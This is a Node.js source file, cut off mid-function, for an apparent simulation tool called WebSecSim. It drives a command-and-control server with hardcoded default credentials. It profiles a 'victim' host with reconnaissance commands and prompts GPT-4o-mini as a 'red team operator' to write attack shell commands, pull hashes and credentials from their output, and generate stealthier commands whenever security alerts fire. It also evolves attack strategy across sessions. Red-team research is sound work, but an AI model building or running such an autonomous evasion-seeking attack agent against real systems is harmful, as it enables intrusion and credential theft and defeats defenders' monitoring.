#!/usr/bin/env node
/**
 * learning-engine.js v3.0 — WebSecSim Self-Improving Attack Engine
 *
 * Research Focus: Autonomous Threat Emulation with Self-Improving AI
 *
 * v3.0 Improvements:
 *   1. ENVIRONMENT FINGERPRINTING  — profiles victim before attacking
 *   2. STRUCTURED OUTPUT ANALYSIS  — extracts intelligence from output
 *   3. DETECTION EVASION LEARNING  — learns to avoid triggering alerts
 *   4. CROSS-SESSION STRATEGY      — AI rewrites strategy every 3 sessions
 *   5. TECHNIQUE CHAINING          — previous output feeds next selection
 *
 * Usage:
 *   node learning-engine.js run --tactic discovery
 *   node learning-engine.js run --tactic credential-access --techniques 5
 *   node learning-engine.js fullchain --tactics discovery,credential-access,persistence
 *   node learning-engine.js profile
 *   node learning-engine.js stats
 *   node learning-engine.js knowledge
 *   node learning-engine.js evolve
 *   node learning-engine.js reset-session
 *   node learning-engine.js export-research
 */

import fs    from 'fs';
import os    from 'os';
import path  from 'path';
import http  from 'http';
import https from 'https';

// ── Config ────────────────────────────────────────────────────────────────────
const C2_BASE_URL    = process.env.C2_BASE_URL    || 'http://websecsim-fastapi:8000';
const C2_USERNAME    = process.env.C2_USERNAME    || 'admin';
const C2_PASSWORD    = process.env.C2_PASSWORD    || 'admin123';
const OPENAI_API_KEY = process.env.OPENAI_API_KEY || '';
const OPENAI_MODEL   = 'gpt-4o-mini';
const OPENAI_URL     = 'https://api.openai.com/v1/chat/completions';

// ── Paths ─────────────────────────────────────────────────────────────────────
const MEMORY_DIR      = path.join(os.homedir(), '.openclaw', 'memory');
const KB_FILE         = path.join(MEMORY_DIR, 'knowledge_base.json');
const SESSION_FILE    = path.join(MEMORY_DIR, 'session_metrics.json');
const RESEARCH_FILE   = path.join(MEMORY_DIR, 'research_log.jsonl');
const PROFILE_FILE    = path.join(MEMORY_DIR, 'victim_profile.json');
const STRATEGY_FILE   = path.join(MEMORY_DIR, 'strategy.json');
const TOKEN_FILE      = path.join(MEMORY_DIR, 'c2_token.txt');

// ── Utilities ─────────────────────────────────────────────────────────────────
function ensureDir(dir) {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

function readJSON(file, fallback) {
  ensureDir(MEMORY_DIR);
  if (fs.existsSync(file)) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch {}
  }
  return fallback;
}

function writeJSON(file, data) {
  ensureDir(MEMORY_DIR);
  fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
}

function logResearch(entry) {
  ensureDir(MEMORY_DIR);
  fs.appendFileSync(RESEARCH_FILE,
    JSON.stringify({ ...entry, logged_at: new Date().toISOString() }) + '\n', 'utf8');
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// ── Knowledge Base ────────────────────────────────────────────────────────────
function loadKB() {
  return readJSON(KB_FILE, {
    version:      '3.0',
    created:      new Date().toISOString(),
    last_updated: new Date().toISOString(),
    total_sessions: 0,
    techniques:   {},
    tactic_weights: {},
    global_stats: {
      total_techniques_tried:    0,
      total_successes:           0,
      total_failures:            0,
      total_ai_commands:         0,
      total_self_improvements:   0,
      novel_techniques_discovered: 0,
      total_detections:          0,
      total_detections_evaded:   0,
    }
  });
}

function saveKB(kb) {
  kb.last_updated = new Date().toISOString();
  writeJSON(KB_FILE, kb);
}

// ── Session ───────────────────────────────────────────────────────────────────
function loadSession() {
  return readJSON(SESSION_FILE, createNewSession());
}

function createNewSession() {
  return {
    session_id:  `session_${Date.now()}`,
    started:     new Date().toISOString(),
    ended:       null,
    victim_profile: null,
    tactics_run: [],
    chain_intelligence: [],   // structured findings passed between tactics
    iterations:  [],
    metrics: {
      techniques_tried:       0,
      successes:              0,
      failures:               0,
      ai_commands_generated:  0,
      self_improvements:      0,
      detections_triggered:   0,
      detections_evaded:      0,
      improvement_rate:       0,
      avg_success_rate:       0,
      novel_chains:           0,
    }
  };
}

function saveSession(session) {
  writeJSON(SESSION_FILE, session);
}

// ── HTTP ──────────────────────────────────────────────────────────────────────
function request(urlStr, options = {}, body = null) {
  return new Promise((resolve, reject) => {
    const url     = new URL(urlStr);
    const isHttps = url.protocol === 'https:';
    const lib     = isHttps ? https : http;
    const bodyStr = body ? JSON.stringify(body) : null;

    const opts = {
      hostname: url.hostname,
      port:     url.port || (isHttps ? 443 : 80),
      path:     url.pathname + url.search,
      method:   options.method || 'GET',
      headers:  options.headers || {},
      timeout:  30000,
    };

    if (bodyStr) {
      opts.headers['Content-Type']   = 'application/json';
      opts.headers['Content-Length'] = Buffer.byteLength(bodyStr);
    }

    const req = lib.request(opts, (res) => {
      let data = '';
      res.on('data', c => { data += c; });
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(data) }); }
        catch { resolve({ status: res.statusCode, body: data }); }
      });
    });

    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

// ── C2 Auth ───────────────────────────────────────────────────────────────────
async function getToken(force = false) {
  if (!force && fs.existsSync(TOKEN_FILE)) {
    const cached = fs.readFileSync(TOKEN_FILE, 'utf8').trim();
    if (cached) return cached;
  }

  const body    = `username=${C2_USERNAME}&password=${C2_PASSWORD}`;
  const url     = new URL(`${C2_BASE_URL}/token`);
  const isHttps = url.protocol === 'https:';
  const lib     = isHttps ? https : http;

  const token = await new Promise((resolve, reject) => {
    const req = lib.request({
      hostname: url.hostname,
      port:     url.port || (isHttps ? 443 : 80),
      path:     '/token',
      method:   'POST',
      headers: {
        'Content-Type':   'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(body),
      },
    }, (r) => {
      let d = '';
      r.on('data', c => { d += c; });
      r.on('end', () => {
        try {
          const p = JSON.parse(d);
          if (p.access_token) resolve(p.access_token);
          else reject(new Error(`Auth failed: ${d}`));
        } catch { reject(new Error(`Auth parse: ${d}`)); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });

  fs.writeFileSync(TOKEN_FILE, token, 'utf8');
  return token;
}

async function c2(method, endpoint, body = null) {
  const token = await getToken();
  let res = await request(`${C2_BASE_URL}${endpoint}`, {
    method, headers: { Authorization: `Bearer ${token}` },
  }, body);

  if (res.status === 401) {
    const fresh = await getToken(true);
    res = await request(`${C2_BASE_URL}${endpoint}`, {
      method, headers: { Authorization: `Bearer ${fresh}` },
    }, body);
  }
  return res;
}

// ── OpenAI GPT-4o mini ────────────────────────────────────────────────────────
async function ai(systemPrompt, userMessage, temperature = 0.3, maxTokens = 400) {
  if (!OPENAI_API_KEY) {
    return null;
  }

  try {
    const res = await request(OPENAI_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${OPENAI_API_KEY}` },
    }, {
      model:       OPENAI_MODEL,
      messages:    [
        { role: 'system', content: systemPrompt },
        { role: 'user',   content: userMessage  },
      ],
      temperature,
      max_tokens:  maxTokens,
    });

    if (res.status !== 200) throw new Error(`OpenAI ${res.status}: ${JSON.stringify(res.body)}`);
    return res.body.choices[0].message.content.trim();
  } catch (e) {
    console.log(`  ⚠  AI call failed: ${e.message}`);
    return null;
  }
}

async function aiJSON(systemPrompt, userMessage, temperature = 0.1, maxTokens = 400) {
  const response = await ai(systemPrompt, userMessage, temperature, maxTokens);
  if (!response) return null;
  try {
    const match = response.match(/\{[\s\S]*\}/);
    if (match) return JSON.parse(match[0]);
  } catch {}
  return null;
}

// ═══════════════════════════════════════════════════════════════
// IMPROVEMENT 1: ENVIRONMENT FINGERPRINTING
// ═══════════════════════════════════════════════════════════════
/**
 * Profile the victim before attacking.
 * Runs 5 quick safe commands to understand the target.
 * This prevents sending GUI commands to headless containers,
 * or kernel exploits to the wrong OS version.
 */
async function profileVictim() {
  console.log('\n🔍 PROFILING VICTIM ENVIRONMENT...');

  // Quick profiling commands — always safe, always informative
  const probeCommands = [
    { key: 'os',       cmd: 'uname -a',                          label: 'OS Info' },
    { key: 'user',     cmd: 'whoami && id',                      label: 'Current User' },
    { key: 'network',  cmd: 'ip addr show | grep inet',          label: 'Network' },
    { key: 'services', cmd: 'systemctl list-units --state=running --type=service --no-pager 2>/dev/null | head -20 || service --status-all 2>/dev/null | head -20', label: 'Services' },
    { key: 'packages', cmd: 'dpkg -l 2>/dev/null | wc -l || rpm -qa 2>/dev/null | wc -l', label: 'Packages' },
  ];

  const rawProfile = { probed_at: new Date().toISOString() };

  for (const probe of probeCommands) {
    try {
      // Queue probe command
      await c2('POST', `/api/attack/T1082`); // use existing technique as vehicle
      await sleep(8000);

      // Get latest output
      const agentsRes = await c2('GET', '/api/agents');
      const hosts = Object.keys(agentsRes.body || {});
      for (const host of hosts) {
        const outRes = await c2('GET', `/api/output/${host}`);
        const outputs = (Array.isArray(outRes.body) ? outRes.body : [])
          .sort((a, b) => new Date(b.time) - new Date(a.time));
        if (outputs.length > 0) {
          rawProfile[probe.key] = outputs[0].output?.slice(0, 300) || '';
          break;
        }
      }
    } catch {}
    console.log(`  ✓ ${probe.label}`);
  }

  // Ask GPT-4o mini to interpret the profile
  let profile = { raw: rawProfile, interpreted: null };

  if (OPENAI_API_KEY && rawProfile.os) {
    const interpreted = await aiJSON(
      `You are a red team operator analyzing a target system.
Extract structured information from system probe output.
Respond with ONLY valid JSON:
{
  "os": "Ubuntu 22.04",
  "kernel": "6.8.11",
  "arch": "x86_64",
  "current_user": "root",
  "is_root": true,
  "is_container": true,
  "has_gui": false,
  "has_python": true,
  "has_perl": false,
  "has_gcc": false,
  "running_services": ["apache2", "sshd"],
  "network_interfaces": ["eth0", "lo"],
  "likely_defenses": ["none"],
  "attack_surface": "high",
  "recommended_tactics": ["discovery", "credential-access"],
  "avoid_techniques": ["T1555"],
  "avoid_reasons": {"T1555": "no GUI/keyring available"},
  "notes": "headless Docker container, root access, no defenses"
}`,
      `OS probe: ${rawProfile.os || 'unknown'}
User probe: ${rawProfile.user || 'unknown'}
Network probe: ${rawProfile.network || 'unknown'}
Services probe: ${rawProfile.services || 'unknown'}
Packages: ${rawProfile.packages || 'unknown'} packages installed`,
      0.1, 500
    );

    if (interpreted) {
      profile.interpreted = interpreted;
      console.log(`\n  🎯 Target: ${interpreted.os} | User: ${interpreted.current_user} | Root: ${interpreted.is_root}`);
      console.log(`  📡 Services: ${(interpreted.running_services || []).slice(0, 5).join(', ')}`);
      console.log(`  🖥  GUI: ${interpreted.has_gui ? 'Yes' : 'No'} | Container: ${interpreted.is_container ? 'Yes' : 'No'}`);
      if (interpreted.avoid_techniques?.length) {
        console.log(`  ⚠  Avoid: ${interpreted.avoid_techniques.join(', ')} (${Object.values(interpreted.avoid_reasons || {}).join(', ')})`);
      }
    }
  }

  writeJSON(PROFILE_FILE, profile);
  logResearch({ type: 'victim_profile', profile: profile.interpreted || rawProfile });
  return profile;
}

function loadProfile() {
  return readJSON(PROFILE_FILE, null);
}

// ═══════════════════════════════════════════════════════════════
// IMPROVEMENT 2: STRUCTURED OUTPUT ANALYSIS
// ═══════════════════════════════════════════════════════════════
/**
 * Deep analysis of command output.
 * Extracts structured intelligence for use in technique chaining.
 */
async function analyzeOutput(technique, command, output, attempt, victimProfile) {
  const outputLower = output.toLowerCase();

  // Heuristic failure detection
  const failureIndicators = [
    'command not found', 'permission denied', 'no such file',
    'operation not permitted', 'cannot open', 'access denied',
    'not found', 'failed to', 'bash:', 'sh:'
  ];

  // Check against known avoid list from profile
  const profileAvoid = victimProfile?.interpreted?.avoid_techniques || [];
  const profileAvoidReasons = victimProfile?.interpreted?.avoid_reasons || {};

  const heuristicFail = output.length < 3 ||
    failureIndicators.some(f => outputLower.includes(f));

  let analysis = {
    success:          !heuristicFail,
    output_length:    output.length,
    failure_reason:   heuristicFail ? (failureIndicators.find(f => outputLower.includes(f)) || 'empty output') : null,
    discovery_value:  0,
    sensitive_data:   false,
    detection_likely: false,

    // Structured intelligence (new in v3)
    intelligence: {
      users_found:       [],
      hashes_found:      [],
      services_found:    [],
      files_found:       [],
      network_info:      {},
      credentials_found: [],
      processes_found:   [],
      next_recommended:  [],
      key_findings:      [],
    },

    ai_analysis: null,
  };

  // Quick sensitive data check
  const sensitivePatterns = ['password', 'passwd', 'secret', 'token', 'hash', 'shadow', 'key', 'credential', 'auth'];
  analysis.sensitive_data = sensitivePatterns.some(p => outputLower.includes(p));
  if (analysis.sensitive_data) analysis.discovery_value += 0.4;
  if (output.length > 500) analysis.discovery_value += 0.3;
  else if (output.length > 50) analysis.discovery_value += 0.15;
  if (!heuristicFail) analysis.discovery_value += 0.3;
  analysis.discovery_value = Math.min(analysis.discovery_value, 1.0);

  // Full AI analysis if available
  if (OPENAI_API_KEY && output.length > 3) {
    const profileContext = victimProfile?.interpreted
      ? `Target context: ${victimProfile.interpreted.os}, user=${victimProfile.interpreted.current_user}, root=${victimProfile.interpreted.is_root}`
      : 'Target context: unknown';

    const aiResult = await aiJSON(
      `You are a red team analyst extracting structured intelligence from command output.
${profileContext}
Respond with ONLY valid JSON — no other text:
{
  "success": true,
  "discovery_value": 0.8,
  "sensitive_data_found": false,
  "detection_likely": false,
  "failure_reason": null,
  "key_findings": ["finding 1", "finding 2"],
  "users_found": ["root", "ubuntu"],
  "hashes_found": ["root:$y$..."],
  "services_found": ["apache2", "sshd"],
  "files_found": ["/etc/passwd"],
  "credentials_found": [],
  "processes_found": ["python3", "bash"],
  "network_info": {"gateway": "172.20.0.1", "interfaces": ["eth0"]},
  "next_recommended": ["T1068", "T1548"],
  "attacker_utility": "one sentence on how attacker uses this",
  "stealth_notes": "any indicators this command would trigger alerts"
}`,
      `Technique: ${technique.id} — ${technique.name}
Command executed: ${command || 'standard API command'}
Attempt: ${attempt}
Output (${output.length} chars):
${output.slice(0, 800)}`,
      0.1, 600
    );

    if (aiResult) {
      analysis.success          = aiResult.success ?? analysis.success;
      analysis.discovery_value  = aiResult.discovery_value ?? analysis.discovery_value;
      analysis.sensitive_data   = aiResult.sensitive_data_found ?? analysis.sensitive_data;
      analysis.detection_likely = aiResult.detection_likely ?? false;
      analysis.failure_reason   = aiResult.failure_reason ?? analysis.failure_reason;
      analysis.intelligence     = {
        users_found:       aiResult.users_found       || [],
        hashes_found:      aiResult.hashes_found      || [],
        services_found:    aiResult.services_found    || [],
        files_found:       aiResult.files_found       || [],
        credentials_found: aiResult.credentials_found || [],
        processes_found:   aiResult.processes_found   || [],
        network_info:      aiResult.network_info      || {},
        next_recommended:  aiResult.next_recommended  || [],
        key_findings:      aiResult.key_findings      || [],
      };
      analysis.ai_analysis = aiResult;

      // Print key findings
      if (aiResult.key_findings?.length) {
        console.log(`  📋 Findings: ${aiResult.key_findings.slice(0, 2).join(' | ')}`);
      }
      if (aiResult.users_found?.length) {
        console.log(`  👤 Users: ${aiResult.users_found.join(', ')}`);
      }
      if (aiResult.hashes_found?.length) {
        console.log(`  🔑 Hashes found: ${aiResult.hashes_found.length}`);
      }
      if (aiResult.next_recommended?.length) {
        console.log(`  ➡  Next recommended: ${aiResult.next_recommended.join(', ')}`);
      }
    }
  }

  return analysis;
}

// ═══════════════════════════════════════════════════════════════
// IMPROVEMENT 3: DETECTION EVASION LEARNING
// ═══════════════════════════════════════════════════════════════
/**
 * After each technique, check if alerts fired.
 * Update technique's detection_rate in KB.
 * Generate stealthier command on next attempt.
 */
async function checkDetection(technique, executedAt, kb) {
  try {
    const alertsRes = await c2('GET', `/api/logs?since_id=0&level=alert&limit=20`);
    const logs = alertsRes.body?.logs || [];

    // Filter alerts that happened after execution
    const execTime = new Date(executedAt).getTime();
    const triggered = logs.filter(l => {
      const logTime = new Date(l.ts).getTime();
      return logTime >= execTime && (
        l.details?.technique === technique.id ||
        l.msg?.includes(technique.id) ||
        l.category === 'attack'
      );
    });

    const detected = triggered.length > 0;

    // Update detection rate in KB (exponential moving average)
    const entry = kb.techniques[technique.id];
    if (entry) {
      const currentRate = entry.detection_rate || 0;
      entry.detection_rate = currentRate * 0.7 + (detected ? 0.3 : 0);

      // Update weight — heavily penalize noisy techniques
      if (entry.detection_rate > 0.5) {
        entry.weight *= 0.8;
        console.log(`  🚨 HIGH detection rate for ${technique.id} — weight reduced to ${entry.weight.toFixed(2)}`);
      } else if (entry.detection_rate < 0.1) {
        entry.weight *= 1.05; // Small boost for stealthy techniques
      }
    }

    if (detected) {
      console.log(`  🚨 Detection triggered — ${triggered.length} alert(s) fired`);
      kb.global_stats.total_detections++;
    } else {
      kb.global_stats.total_detections_evaded++;
    }

    logResearch({
      type:           'detection_check',
      technique_id:   technique.id,
      detected,
      alerts_count:   triggered.length,
      detection_rate: entry?.detection_rate || 0,
    });

    return { detected, alerts: triggered };
  } catch {
    return { detected: false, alerts: [] };
  }
}

/**
 * Generate a stealthier command based on detection feedback.
 */
async function generateStealthCommand(technique, detectedCommand, detectionAlerts) {
  if (!OPENAI_API_KEY) return null;

  const alertContext = detectionAlerts
    .map(a => `- [${a.level}] ${a.category}: ${a.msg}`)
    .join('\n');

  const stealthCmd = await ai(
    `You are a red team operator generating stealthy shell commands.
The previous command triggered security alerts. Generate a STEALTHIER alternative
that achieves the same objective with less noise.
Rules:
- No rm -rf, mkfs, dd or destructive commands
- Prefer native OS tools over installing packages
- Avoid writing to disk when possible
- Use built-in shell features instead of external tools
- Slower is better than noisy
Respond with ONLY the shell command.`,
    `Technique: ${technique.id} — ${technique.name}
Command that was DETECTED: ${detectedCommand}
Alerts triggered:
${alertContext}

Generate a stealthier alternative command:`,
    0.5, 100
  );

  if (stealthCmd && stealthCmd.length > 3) {
    const clean = stealthCmd.replace(/^```[\w]*\n?/, '').replace(/\n?```$/, '').trim();
    console.log(`  🥷 Stealth command generated: ${clean.slice(0, 80)}`);
    return clean;
  }
  return null;
}

// ═══════════════════════════════════════════════════════════════
// IMPROVEMENT 4: CROSS-SESSION STRATEGY EVOLUTION
// ═══════════════════════════════════════════════════════════════
/**
 * Every 3 sessions, GPT-4o mini reviews all outcomes
 * and rewrites the attack strategy.
 */
async function evolveStrategy(kb) {
  if (!OPENAI_API_KEY) {
    console.log('⚠  OPENAI_API_KEY not set — strategy evolution requires AI');
    return;
  }

  console.log('\n🧬 EVOLVING ATTACK STRATEGY...');
  console.log(`   Analyzing ${kb.total_sessions} sessions | ${kb.global_stats.total_techniques_tried} techniques tried`);

  // Build success/failure patterns
  const techStats = Object.values(kb.techniques).map(t => ({
    id:             t.technique_id,
    name:           t.name,
    tactic:         t.tactic,
    success_rate:   t.success_rate,
    attempts:       t.attempts,
    weight:         t.weight,
    detection_rate: t.detection_rate || 0,
    discovery_value: t.discovery_value,
    best_command:   t.commands.sort((a, b) => (b.successes / Math.max(b.attempts, 1)) - (a.successes / Math.max(a.attempts, 1)))[0]?.command,
  }));

  const successTechs  = techStats.filter(t => t.success_rate > 0.7).slice(0, 10);
  const failTechs     = techStats.filter(t => t.success_rate < 0.3).slice(0, 10);
  const noisyTechs    = techStats.filter(t => t.detection_rate > 0.3).slice(0, 5);
  const stealthTechs  = techStats.filter(t => t.detection_rate < 0.1 && t.success_rate > 0.5).slice(0, 5);

  const evolution = await aiJSON(
    `You are an AI red team strategist reviewing attack session data.
Analyze the patterns and provide updated strategy recommendations.
Respond with ONLY valid JSON:
{
  "strategy_version": 2,
  "summary": "one paragraph summary of what was learned",
  "tactic_priorities": {
    "discovery": 1.5,
    "credential-access": 1.2,
    "persistence": 0.8,
    "defense-evasion": 1.0,
    "privilege-escalation": 0.9
  },
  "avoid_techniques": ["T1555", "T1047"],
  "prioritize_techniques": ["T1082", "T1057"],
  "command_preferences": {
    "prefer_native_tools": true,
    "avoid_package_install": true,
    "prefer_read_only": false,
    "time_of_day_bias": "none"
  },
  "chain_recommendations": [
    {"from": "T1082", "to": "T1068", "reason": "kernel version reveals priv esc path"}
  ],
  "research_findings": ["finding 1", "finding 2"],
  "next_session_focus": "credential-access"
}`,
    `Sessions analyzed: ${kb.total_sessions}
Total techniques tried: ${kb.global_stats.total_techniques_tried}
Overall success rate: ${(kb.global_stats.total_successes / Math.max(kb.global_stats.total_techniques_tried, 1) * 100).toFixed(1)}%
Detection rate: ${(kb.global_stats.total_detections / Math.max(kb.global_stats.total_techniques_tried, 1) * 100).toFixed(1)}%

HIGH SUCCESS techniques (>70%):
${JSON.stringify(successTechs, null, 2)}

LOW SUCCESS techniques (<30%):
${JSON.stringify(failTechs, null, 2)}

NOISY techniques (detected >30%):
${JSON.stringify(noisyTechs, null, 2)}

STEALTHY techniques (detected <10%, success >50%):
${JSON.stringify(stealthTechs, null, 2)}

Current tactic weights: ${JSON.stringify(kb.tactic_weights)}`,
    0.3, 800
  );

  if (evolution) {
    // Apply tactic priority updates
    if (evolution.tactic_priorities) {
      for (const [tactic, weight] of Object.entries(evolution.tactic_priorities)) {
        kb.tactic_weights[tactic] = weight;
      }
    }

    // Penalize avoid techniques
    if (evolution.avoid_techniques) {
      for (const tid of evolution.avoid_techniques) {
        if (kb.techniques[tid]) {
          kb.techniques[tid].weight = Math.min(kb.techniques[tid].weight, 0.3);
        }
      }
    }

    // Boost prioritized techniques
    if (evolution.prioritize_techniques) {
      for (const tid of evolution.prioritize_techniques) {
        if (kb.techniques[tid]) {
          kb.techniques[tid].weight = Math.max(kb.techniques[tid].weight, 2.5);
        }
      }
    }

    // Save strategy
    const strategy = {
      version:          evolution.strategy_version || 1,
      evolved_at:       new Date().toISOString(),
      after_sessions:   kb.total_sessions,
      summary:          evolution.summary,
      tactic_priorities: evolution.tactic_priorities,
      avoid_techniques: evolution.avoid_techniques,
      prioritize_techniques: evolution.prioritize_techniques,
      command_preferences: evolution.command_preferences,
      chain_recommendations: evolution.chain_recommendations,
      research_findings: evolution.research_findings,
      next_session_focus: evolution.next_session_focus,
    };

    writeJSON(STRATEGY_FILE, strategy);
    saveKB(kb);

    console.log(`\n  ✅ Strategy evolved to v${strategy.version}`);
    console.log(`  📊 Summary: ${evolution.summary?.slice(0, 120)}...`);
    if (evolution.research_findings?.length) {
      console.log(`  🔬 Research findings:`);
      evolution.research_findings.forEach(f => console.log(`     - ${f}`));
    }
    console.log(`  🎯 Next session focus: ${evolution.next_session_focus}`);

    logResearch({ type: 'strategy_evolution', strategy });
    return strategy;
  }

  console.log('  ⚠  Strategy evolution failed — keeping current weights');
  return null;
}

function loadStrategy() {
  return readJSON(STRATEGY_FILE, null);
}

// ═══════════════════════════════════════════════════════════════
// IMPROVEMENT 5: TECHNIQUE CHAINING
// ═══════════════════════════════════════════════════════════════
/**
 * Use previous output intelligence to inform next technique selection.
 * T1082 reveals kernel → select T1068 for that specific kernel
 * T1057 reveals services → select techniques targeting those services
 */
async function selectWithChaining(tactic, candidates, kb, excludeIds, chainIntelligence, victimProfile) {
  if (!OPENAI_API_KEY || !chainIntelligence.length) {
    return selectTechniqueWeighted(candidates, kb, excludeIds);
  }

  // Build chain context from previous findings
  const chainContext = chainIntelligence
    .map(c => `[${c.technique_id}] ${c.tactic}: ${c.key_findings?.join(', ') || 'no findings'}
  Users: ${c.users_found?.join(', ') || 'none'}
  Services: ${c.services_found?.join(', ') || 'none'}
  Processes: ${c.processes_found?.join(', ') || 'none'}
  Network: ${JSON.stringify(c.network_info || {})}
  Hashes: ${c.hashes_found?.length || 0} found
  Next recommended: ${c.next_recommended?.join(', ') || 'none'}`)
    .join('\n\n');

  const profileContext = victimProfile?.interpreted
    ? `Target: ${victimProfile.interpreted.os} | User: ${victimProfile.interpreted.current_user} | Root: ${victimProfile.interpreted.is_root} | Container: ${victimProfile.interpreted.is_container}`
    : '';

  const techList = candidates
    .filter(t => !excludeIds.includes(t.id))
    .map(t => {
      const known = kb.techniques[t.id];
      const perf = known
        ? `(success:${(known.success_rate * 100).toFixed(0)}%, detection:${((known.detection_rate||0)*100).toFixed(0)}%, weight:${known.weight?.toFixed(2)})`
        : '(novel)';
      return `- ${t.id}: ${t.name} ${perf}`;
    })
    .join('\n');

  const aiChoice = await ai(
    `You are a red team AI operator selecting the next attack technique.
Use chain intelligence from previous findings to make the most strategic choice.
Consider: what services were found, what users exist, what network was discovered.
Choose a technique that directly exploits or builds on previous findings.
Respond with ONLY the technique ID (e.g. T1068).`,
    `Current tactic: ${tactic}
${profileContext}

CHAIN INTELLIGENCE (previous findings this session):
${chainContext}

Available techniques:
${techList}

Already executed: ${excludeIds.join(', ') || 'none'}

Which technique best exploits the chain intelligence? Reply with ONLY the T-code:`,
    0.2, 20
  );

  if (aiChoice) {
    const match = aiChoice.match(/T\d{4}(\.\d{3})?/i);
    if (match) {
      const chosen = candidates.find(t =>
        t.id.toUpperCase() === match[0].toUpperCase() &&
        !excludeIds.includes(t.id)
      );
      if (chosen) {
        console.log(`  ⛓  Chain-selected: ${chosen.id} — ${chosen.name}`);
        return chosen;
      }
    }
  }

  return selectTechniqueWeighted(candidates, kb, excludeIds);
}

// ── Weighted Random Selection (fallback) ─────────────────────────────────────
function selectTechniqueWeighted(candidates, kb, excludeIds) {
  const filtered = candidates.filter(t => !excludeIds.includes(t.id));
  if (!filtered.length) return null;

  const strategy = loadStrategy();
  const avoidList = strategy?.avoid_techniques || [];

  const weighted = filtered.map(t => {
    const known = kb.techniques[t.id];
    let weight = known?.weight || 1.3;

    // Apply strategy avoid list
    if (avoidList.includes(t.id)) weight *= 0.1;

    // Penalize noisy techniques
    if (known?.detection_rate > 0.5) weight *= 0.6;

    return { ...t, weight };
  });

  const total = weighted.reduce((s, t) => s + t.weight, 0);
  let rand = Math.random() * total;
  for (const t of weighted) {
    rand -= t.weight;
    if (rand <= 0) {
      console.log(`  🎲 Weighted random: ${t.id} — ${t.name}`);
      return t;
    }
  }
  return weighted[0];
}

// ── Command Generation ────────────────────────────────────────────────────────
async function generateCommand(technique, kb, attempt, previousFailure, detectionInfo, victimProfile) {
  const known = kb.techniques[technique.id];

  // Strategy: use stealthy command if detection was triggered
  if (detectionInfo?.detected && detectionInfo?.alerts?.length && attempt > 1) {
    const stealthCmd = await generateStealthCommand(
      technique,
      previousFailure?.command || 'unknown',
      detectionInfo.alerts
    );
    if (stealthCmd) return { command: stealthCmd, source: 'stealth-improved' };
  }

  // On first attempt, try best known command
  if (attempt === 1 && known?.commands?.length > 0) {
    const bestCmd = known.commands
      .filter(c => c.successes > 0)
      .sort((a, b) => (b.successes / Math.max(b.attempts, 1)) - (a.successes / Math.max(a.attempts, 1)))[0];

    if (bestCmd && (bestCmd.successes / bestCmd.attempts) > 0.7) {
      console.log(`  📚 Using learned command (${(bestCmd.successes/bestCmd.attempts*100).toFixed(0)}% rate)`);
      return { command: bestCmd.command, source: 'learned' };
    }
  }

  // AI command generation
  if (OPENAI_API_KEY) {
    const failureCtx = previousFailure
      ? `\nPrevious command FAILED: "${previousFailure.command}"\nError: "${(previousFailure.output || '').slice(0, 150)}"\nGenerate a completely DIFFERENT approach.`
      : '';

    const profileCtx = victimProfile?.interpreted ? `
Target environment:
- OS: ${victimProfile.interpreted.os}
- User: ${victimProfile.interpreted.current_user} (root: ${victimProfile.interpreted.is_root})
- Has GUI: ${victimProfile.interpreted.has_gui}
- Is container: ${victimProfile.interpreted.is_container}
- Running services: ${(victimProfile.interpreted.running_services || []).join(', ')}
- Avoid: ${(victimProfile.interpreted.avoid_techniques || []).join(', ')}` : '';

    const knownCmds = known?.commands?.map(c =>
      `  "${c.command}" (${c.successes}/${c.attempts} success, source:${c.source})`
    ).join('\n') || '  None yet';

    const stealthPref = loadStrategy()?.command_preferences;
    const stealthNote = stealthPref
      ? `\nCommand preferences: prefer_native=${stealthPref.prefer_native_tools}, avoid_package_install=${stealthPref.avoid_package_install}`
      : '';

    const aiCmd = await ai(
      `You are a red team operator generating shell commands for a target system.
Generate SAFE, NON-DESTRUCTIVE commands. Never use: rm -rf, mkfs, dd, fork bombs.
Consider the target environment carefully — don't suggest GUI tools for headless systems.
Prefer native OS tools. Respond with ONLY the shell command.`,
      `Technique: ${technique.id} — ${technique.name}
Tactic: ${technique.tactic}
Description: ${(technique.description || '').slice(0, 200)}
${profileCtx}
${stealthNote}

Commands tried so far:
${knownCmds}
${failureCtx}

Write a single effective shell command:`,
      0.4, 100
    );

    if (aiCmd && aiCmd.length > 3 && !aiCmd.toLowerCase().includes('rm -rf')) {
      const clean = aiCmd.replace(/^```[\w]*\n?/, '').replace(/\n?```$/, '').trim();
      console.log(`  🧠 AI command: ${clean.slice(0, 80)}${clean.length > 80 ? '...' : ''}`);
      return {
        command: clean,
        source: attempt > 1 ? 'self-improved' : 'ai-generated'
      };
    }
  }

  return { command: null, source: 'standard-api' };
}

// ── Execution ─────────────────────────────────────────────────────────────────
async function executeTechnique(technique, command, waitSeconds = 12) {
  const ts = new Date().toISOString();

  try {
    let res;

    if (command) {
      // Try auto endpoint with override first
      res = await c2('POST', '/api/attack/auto', {
        tactic:               technique.tactic,
        exclude:              [],
        override_command:     command,
        override_technique:   technique.id,
      });

      // Fallback to standard if auto doesn't support override
      if (res.status === 422 || res.status === 404 || res.status === 405) {
        res = await c2('POST', `/api/attack/${technique.id}`);
      }
    } else {
      res = await c2('POST', `/api/attack/${technique.id}`);
    }

    if (res.status === 200 || res.status === 201) {
      console.log(`  ✅ Queued — waiting ${waitSeconds}s...`);
      await sleep(waitSeconds * 1000);

      // Collect output
      const agentsRes = await c2('GET', '/api/agents');
      const hosts = Object.keys(agentsRes.body || {});
      let output = '';

      for (const host of hosts) {
        const outRes = await c2('GET', `/api/output/${host}`);
        const outputs = (Array.isArray(outRes.body) ? outRes.body : [])
          .filter(o => o.technique === technique.id)
          .sort((a, b) => new Date(b.time) - new Date(a.time));
        if (outputs.length > 0) {
          output = outputs[0].output || '';
          break;
        }
      }

      return { success: true, output, queued_at: ts, command };
    } else if (res.status === 404) {
      return { success: false, output: 'Technique not in command list — needs AI command', queued_at: ts, command };
    } else {
